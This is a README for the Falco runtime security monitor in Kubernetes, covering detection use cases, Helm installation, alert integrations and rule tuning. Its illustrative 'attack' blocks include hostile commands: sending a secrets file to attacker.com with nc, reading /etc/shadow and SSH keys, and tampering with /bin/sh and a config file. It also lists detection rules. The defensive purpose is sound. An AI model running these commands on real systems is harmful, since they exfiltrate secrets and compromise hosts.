# Falco - Runtime Security Monitoring

Falco is a cloud-native runtime security tool that detects unexpected behavior, intrusions, and data theft in real-time.

## What Falco Does

**Runtime Threat Detection:** Monitors system calls in running containers using eBPF to detect anomalous behavior.

**How it works:**
1. DaemonSet runs on every node
2. Uses eBPF to hook into kernel system calls
3. Matches behavior against rules
4. Triggers alerts when suspicious activity detected
5. Sends notifications to Slack/PagerDuty/Syslog/SIEM

## When to Use Falco

### ✅ Use Falco When:

**1. Production environment**
- Running in production with real user data
- Need real-time threat detection
- Want visibility into container behavior

**2. Compliance requirements (HIPAA/SOC2/PCI)**
- HIPAA requires runtime monitoring for PHI access
- SOC2 requires intrusion detection
- PCI-DSS requires file integrity monitoring
- Need audit trail of security events

**3. Handling sensitive data**
- PHI (Protected Health Information)
- PII (Personally Identifiable Information)
- Financial data
- Credentials/secrets

**4. Large deployments (>100 users)**
- Overhead justified by threat protection
- Multiple teams accessing systems
- Higher attack surface

### ❌ Skip Falco When:

**1. Dev/staging environments**
- Too noisy for development
- False positives from debugging
- Overhead not justified

**2. Small deployments (<100 users)**
- Low risk profile
- Manual monitoring sufficient
- Resource overhead not justified

**3. Non-sensitive workloads**
- No sensitive data
- Public-facing content only
- Low security requirements

## Use Cases with Examples

### Use Case 1: Detect Shell in Container

**Scenario:** Attacker exploits vulnerability and spawns interactive shell.

**Attack:**
```bash
# Attacker gains shell access
kubectl exec -it api-pod -- /bin/bash
```

**Falco Detection:**
```
11:45:32.123456789: Notice Shell spawned in container
  (user=root
  container_id=abc123
  container_name=api
  image=ghcr.io/YOUR-ORG/monobase-api:5.215.2
  shell=/bin/bash
  parent=runc
  cmdline=bash
  pid=12345)
```

**Alert sent to:** Slack, PagerDuty
**Response:** Investigate, kill pod, check for compromise

### Use Case 2: Detect Sensitive File Read

**Scenario:** Malicious process tries to read sensitive files.

**Attack:**
```bash
# Attacker reads system files
kubectl exec -it api-pod -- cat /etc/shadow
kubectl exec -it api-pod -- cat /root/.ssh/id_rsa
```

**Falco Detection:**
```
11:46:15.987654321: Warning Sensitive file read
  (file=/etc/shadow
  container=api
  user=root
  command=cat /etc/shadow
  pid=12346)
```

**Alert sent to:** PagerDuty (high priority)
**Response:** Immediate investigation, potential container kill

### Use Case 3: Detect Unexpected Network Connection

**Scenario:** Cryptominer or data exfiltration attempt.

**Attack:**
```bash
# Malware opens outbound connection
curl http://malicious-mining-pool.com:3333
nc attacker.com 4444 < /var/secrets/database.txt
```

**Falco Detection:**
```
11:47:22.111222333: Error Unexpected outbound connection
  (connection=tcp://malicious-mining-pool.com:3333
  container=api
  process=curl
  direction=outbound
  proto=tcp
  pid=12347)
```

**Alert sent to:** PagerDuty, SIEM
**Response:** Block connection, isolate pod, forensics

### Use Case 4: Detect Privilege Escalation

**Scenario:** Attacker tries to escalate privileges.

**Attack:**
```bash
# Try to gain root
sudo su -
# Or modify privileged files
chmod 4755 /usr/bin/malware
```

**Falco Detection:**
```
11:48:01.444555666: Critical Privilege escalation attempt
  (user=app
  target_user=root
  command=sudo su -
  container=api
  pid=12348)
```

**Alert sent to:** PagerDuty (critical), SIEM
**Response:** Immediate pod termination, security incident

### Use Case 5: Detect File Modification

**Scenario:** Attacker modifies binaries or configs.

**Attack:**
```bash
# Modify system binaries
echo "backdoor" >> /bin/sh
# Or app configs
sed -i 's/admin_password=.*/admin_password=hacked/' /app/config.ini
```

**Falco Detection:**
```
11:49:33.777888999: Warning File modification in container
  (file=/bin/sh
  container=api
  user=root
  command=echo
  pid=12349)
```

**Alert sent to:** Slack, Syslog
**Response:** Investigate changes, rollback, redeploy

### Use Case 6: Detect Package Manager

**Scenario:** Attacker tries to install tools (persistence).

**Attack:**
```bash
# Install malware or tools
apt-get install nmap
pip install cryptominer
```

**Falco Detection:**
```
11:50:12.101112131: Notice Package management tool in container
  (command=apt-get install nmap
  container=api
  user=root
  pid=12350)
```

**Alert sent to:** Slack
**Response:** Investigate, containers should be immutable

## Installation

### Step 1: Install Falco DaemonSet

```bash
# Add Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco (runs on all nodes)
helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --values helm-values.yaml

# Verify Falco is running on all nodes
kubectl get pods -n falco -o wide

# Check Falco logs
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
```

### Step 2: Configure Alert Destinations

Edit `helm-values.yaml` to configure alerts:

**Slack:**
```yaml
falco:
  jsonOutput: true
  httpOutput:
    enabled: true
    url: "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK"
```

**Syslog:**
```yaml
falco:
  syslogOutput:
    enabled: true
    host: "syslog-server.example.com"
    port: 514
```

**File (for SIEM):**
```yaml
falco:
  fileOutput:
    enabled: true
    filename: "/var/log/falco/events.log"
```

### Step 3: Apply Custom Rules

```bash
# Apply custom rules
kubectl apply -f rules/

# Reload Falco to pick up new rules
kubectl rollout restart daemonset/falco -n falco
```

### Step 4: Test Detection

```bash
# Test 1: Spawn shell (should trigger alert)
kubectl exec -it api-pod -- /bin/bash
exit

# Test 2: Read sensitive file (should trigger alert)
kubectl exec -it api-pod -- cat /etc/shadow

# Check Falco logs for alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50 | grep "Notice\|Warning\|Error"
```

## Included Rules

### Default Falco Rules

Falco ships with comprehensive default rules:

- **Shell in container** - Interactive shells spawned
- **Sensitive file access** - /etc/shadow, SSH keys, etc.
- **Unexpected network activity** - Outbound connections
- **Package managers** - apt, yum, pip in containers
- **File modifications** - Changes to /bin, /sbin, /usr/bin
- **Privilege escalation** - sudo, su, setuid
- **Container drift** - New files in containers

### Custom Rules (This Repo)

**1. API-Specific Rules** (`rules/api-rules.yaml`)
- Database credential access
- Config file modifications
- Unexpected API behavior

**2. Database Rules** (`rules/database-rules.yaml`)
- Direct database file access
- Backup tampering
- Unauthorized DB connections

## Alert Severity Levels

| Level | Description | Action | Examples |
|-------|-------------|--------|----------|
| **Emergency** | System unusable | Immediate response | - |
| **Alert** | Action must be taken | Page on-call | - |
| **Critical** | Critical conditions | Page on-call | Privilege escalation |
| **Error** | Error conditions | Investigate | Unexpected connections |
| **Warning** | Warning conditions | Review | Sensitive file read |
| **Notice** | Normal but significant | Log only | Shell in container |
| **Informational** | Informational | Log only | Package manager |
| **Debug** | Debug messages | Disabled | - |

## Configuring Alerts

### Slack Integration

```yaml
# In helm-values.yaml
falco:
  jsonOutput: true
  httpOutput:
    enabled: true
    url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
```

**Alert format:**
```
⚠️ Falco Security Alert
Rule: Shell spawned in container
Priority: Notice
Container: api-pod (myclient-prod)
User: root
Command: /bin/bash
Time: 2025-10-15 11:45:32 UTC
```

### PagerDuty Integration

```yaml
# In helm-values.yaml
falco:
  jsonOutput: true
  httpOutput:
    enabled: true
    url: "https://events.pagerduty.com/v2/enqueue"
  programOutput:
    enabled: true
    program: "jq '{service_key: \"YOUR-PAGERDUTY-KEY\", event_type: \"trigger\", description: .output}' | curl -X POST -H 'Content-Type: application/json' -d @- https://events.pagerduty.com/generic/2010-04-15/create_event.json"
```

### SIEM Integration

```yaml
# Forward to SIEM via syslog
falco:
  syslogOutput:
    enabled: true
    host: "siem.example.com"
    port: 514
    format: json
```

## Tuning for Production

### Reduce False Positives

**1. Exclude Known Processes**
```yaml
# In custom rules
- list: known_shell_spawners
  items: [kubectl, docker, crictl]

- rule: Shell spawned in container
  condition: >
    spawned_process and
    container and
    shell_procs and
    not proc.pname in (known_shell_spawners)
```

**2. Adjust Priority Levels**
```yaml
# Lower priority for non-critical alerts
- rule: Package management tool in container
  priority: INFO  # Was NOTICE
```

**3. Filter by Namespace**
```yaml
# Only monitor production namespaces
- macro: production_namespace
  condition: k8s.ns.name glob "* -prod"

- rule: Shell spawned in container
  condition: production_namespace and spawned_process and shell_procs
```

### Performance Tuning

**Resource limits:**
```yaml
# In helm-values.yaml
resources:
  requests:
    cpu: 100m
    memory: 256Mi
  limits:
    cpu: 500m
    memory: 512Mi
```

**Drop rate (if CPU constrained):**
```yaml
falco:
  syscall_event_drops:
    actions:
      - log
      - alert
    rate: 0.03333  # Max 3.33% drop rate
```

## Monitoring Falco

### Check Falco Status

```bash
# Check pods are running
kubectl get pods -n falco

# Check resource usage
kubectl top pods -n falco

# Check for dropped events
kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Falco internal"
```

### Falco Metrics

```bash
# Port-forward metrics endpoint
kubectl port-forward -n falco svc/falco 8765:8765

# View metrics
curl http://localhost:8765/metrics
```

**Key metrics:**
- `falco_events_total` - Total events processed
- `falco_drops_total` - Events dropped (high = CPU issue)
- `falco_outputs_total` - Alerts sent
- `falco_rules_total` - Active rules

## Troubleshooting

### Too Many Alerts

**Problem:** Alert fatigue from false positives.

**Solutions:**
1. Start with high-priority alerts only (Error, Critical)
2. Exclude known-good processes
3. Tune rules for your environment
4. Use audit mode before enforce

```yaml
# Only alert on high-priority
falco:
  priority: ERROR  # Was NOTICE
```

### Falco Not Detecting Events

**Check 1: Verify Falco is running**
```bash
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco
```

**Check 2: Test with known trigger**
```bash
kubectl exec -it api-pod -- /bin/bash
# Should trigger alert
```

**Check 3: Check rules are loaded**
```bash
kubectl exec -it -n falco $(kubectl get pod -n falco -l app.kubernetes.io/name=falco -o name | head -1) -- falco --list
```

### High CPU Usage

**Problem:** Falco consuming too much CPU.

**Solutions:**
1. Increase resource limits
2. Reduce rule complexity
3. Filter events by namespace
4. Disable low-priority rules

## Best Practices

### 1. Start with Critical Alerts Only
- Begin with Error/Critical priority
- Gradually add Warning/Notice as you tune

### 2. Test in Staging First
- Deploy to staging environment
- Tune rules before production
- Reduce false positives

### 3. Document Alert Response
- Create runbooks for each alert type
- Define severity escalation
- Train team on responses

### 4. Regular Rule Reviews
- Review rules quarterly
- Remove/update obsolete rules
- Add new rules for new threats

### 5. Integration with Incident Response
- Connect to SIEM for correlation
- Link to ticketing system
- Automate containment actions

## Resources

- [Falco Documentation](https://falco.org/docs/)
- [Falco Rules](https://github.com/falcosecurity/rules)
- [Falco Playground](https://falco.org/docs/event-sources/sample-events/)

## See Also

- [Kyverno Admission Control](../kyverno/README.md)
- [Baseline Security](../../security/README.md)
- [Security Tools Overview](../README.md)
